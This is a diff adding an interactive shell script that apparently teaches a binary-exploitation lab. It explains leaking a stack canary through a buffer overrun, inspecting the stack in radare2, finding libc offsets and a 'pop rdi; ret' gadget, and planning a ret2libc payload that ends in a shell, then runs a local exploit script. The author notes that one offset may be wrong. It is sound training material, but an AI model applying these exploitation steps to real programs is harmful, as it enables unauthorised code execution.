@@ -1,0 +1,115 @@
+#!/bin/sh
+
+BLUE="\033[1;34m"
+RED="\033[1;31m"
+NEUT="\033[0m"
+
+printf "$BLUE
+Remember to turn on aslr
+$NEUT
+../../aslr.sh on"
+read
+../../aslr.sh on
+
+
+printf "$BLUE
+Simple buffer overrun
+But we are able to get a leak before the stack is checked
+No need for forking, we can get the canary printf'd
+
+Find the location of the canary
+$NEUT
+perl -e 'print \"A\"x105' | ./leak"
+read
+perl -e 'print "A"x105' | ./leak | head -c 160
+
+printf "$BLUE
+
+The bit of nonsense stuff is part of the canary
+It is not possible to print the canary without overwriting the first byte
+The first byte is always (usualy) null to prevent it being printed
+Which means we have to overrun it, but we know it, so it doesn't matter"
+read
+
+printf "$BLUE
+I go into radare to look at the stack layout
+$NEUT
+r2 -A -d leak
+[0x7f1ce1120090]> dcu sym.vuln
+[0x562ae76ab1a9]> dcu 0x0x562ae76ab1a9       # just after the read call for me
+$BLUE
+The stack canary is stored in this special register
+$NEUT
+[0x562ae76ab214]> pxq @ fs"
+read
+
+printf "0x7f1ce10ee580  0x00007f1ce10ee580  0x00007f1ce0f1f010   ................
+0x7f1ce10ee590  0x00007f1ce10ee580  0x0000000000000000   ................
+0x7f1ce10ee5a0  0x0000000000000000 $RED 0xa31d5720b1f57000 $NEUT  .........p.. W..  <--- here"
+
+printf "$BLUE
+Print the stack
+$NEUT
+[0x562ae76ab214]> pxq @ rsp"
+read
+
+printf "0x7ffe277a43a0  0x0000000000000000  0x0000000000000000
+0x7ffe277a43b0  0x6473616c66647361  0x3b6473616b6c663b 
+0x7ffe277a43c0  0x0000000a61666b6c  0x0000000000000000
+0x7ffe277a43d0  0x0000000000000000  0x0000000000000000
+0x7ffe277a43e0  0x0000000000000000  0x0000000000000000
+0x7ffe277a43f0  0x0000000000000000  0x0000000000000000
+0x7ffe277a4400  0x0000000000000000  0x0000000000000000
+0x7ffe277a4410  0x0000000000000000 $RED 0xa31d5720b1f57000 $NEUT $RED 1 $NEUT
+0x7ffe277a4420 $RED 0x00007ffe277a4430  0x0000562ae76ab2b9 $NEUT $RED 2, 3 $NEUT
+0x7ffe277a4430  0x0000000000000000 $RED 0x00007f1ce0f48b25 $NEUT $RED 4 $NEUT
+0x7ffe277a4440  0x00007ffe277a4528  0x0000000100000064
+0x7ffe277a4450  0x0000562ae76ab2b0  0x0000000000001000
+$BLUE
+
+1. Is the stack canary
+2. Is the base pointer, the address of the stack (look at the addresses on the left)
+3. Is the return address, an address in the .text section
+4. Is an address in libc (probably)"
+read
+
+printf "$BLUE
+You should now use dmi libc 'X' to find the offsets from the functions in libc we will need
+Mine are:
+
+system = 0x222bb
+binsh = 0x16403d    # this might not be right
+exit = 0x17b0b
+setuid = 0xa4e2b
+
+Now we need to find a 'pop rdi;ret'
+$NEUT
+ROPgadget --binary leak | grep rdi"
+read
+ROPgadget --binary leak | grep rdi
+
+
+printf "$BLUE
+Searching through the binary I find this pop 0x69 bytes from the return address
+
+We can now plan the exploit:"
+read
+
+printf "
+send until overwriting the canary null byte, leaking the canary
+add canary to payload
+add 8 more bytes, send, overwriting the base pointer but leaking the return address 
+add 16 more bytes to leak libc
+calculate the addresses from the ofsets
+construct rest of the payload like normal (see level2 'normal' onwards)
+send
+shell
+
+Quit, go look at the exploit, or better, write your own"
+read
+
+printf "$NEUT
+python3 sol/exploit.py"
+read
+python3 sol/exploit.py
+
